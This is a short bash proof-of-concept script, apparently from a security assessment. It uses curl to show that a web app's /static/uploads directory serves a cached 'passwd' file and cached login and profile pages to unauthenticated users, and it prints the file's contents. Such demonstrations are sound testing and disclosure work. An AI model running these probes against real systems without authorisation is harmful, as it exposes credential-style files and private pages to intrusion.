#!/bin/bash

# POC: Unauthorized Access to Sensitive Files in /static/uploads Directory
# This script demonstrates that unauthenticated users can access sensitive files
# cached in the /static/uploads directory without any authentication

TARGET_URL="http://localhost:3000"
UPLOADS_DIR="/static/uploads"

echo "[*] Testing unauthorized access to /static/uploads directory"
echo "[*] Target: $TARGET_URL$UPLOADS_DIR"
echo ""

# Test 1: Attempt to access /etc/passwd file via /static/uploads
echo "[+] Test 1: Attempting to access /etc/passwd via /static/uploads/"
RESPONSE=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET_URL$UPLOADS_DIR/passwd")
echo "Response Code: $RESPONSE"

if [ "$RESPONSE" == "200" ]; then
    echo "✓ File is accessible (HTTP 200)"
    echo "[*] Retrieving file contents:"
    curl -s "$TARGET_URL$UPLOADS_DIR/passwd" | head -10
    echo ""
else
    echo "✗ File not accessible (HTTP $RESPONSE)"
    exit 1
fi

echo ""

# Test 2: Attempt to access cached login page
echo "[+] Test 2: Attempting to access cached login page"
RESPONSE=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET_URL$UPLOADS_DIR/login")
echo "Response Code: $RESPONSE"

if [ "$RESPONSE" == "200" ]; then
    echo "✓ Cached login page is accessible (HTTP 200)"
else
    echo "✗ Cached login page not accessible (HTTP $RESPONSE)"
fi

echo ""

# Test 3: Attempt to access cached profile page
echo "[+] Test 3: Attempting to access cached profile page"
RESPONSE=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET_URL$UPLOADS_DIR/profile")
echo "Response Code: $RESPONSE"

if [ "$RESPONSE" == "200" ]; then
    echo "✓ Cached profile page is accessible (HTTP 200)"
else
    echo "✗ Cached profile page not accessible (HTTP $RESPONSE)"
fi

echo ""

# Test 4: Verify no authentication is required (no session cookie needed)
echo "[+] Test 4: Verifying that NO authentication is required"
echo "[*] Accessing /static/uploads/passwd without any session cookie:"
RESPONSE=$(curl -s -w "\nHTTP Status: %{http_code}\n" "$TARGET_URL$UPLOADS_DIR/passwd")
HTTP_CODE=$(echo "$RESPONSE" | tail -1 | cut -d' ' -f3)

if [ "$HTTP_CODE" == "200" ]; then
    echo "✓ File accessible WITHOUT authentication (HTTP 200)"
    echo "✓ VULNERABILITY CONFIRMED: Unauthenticated access to /static/uploads"
else
    echo "✗ Authentication may be required"
fi

echo ""
echo "[+] POC Complete - Vulnerability demonstrated"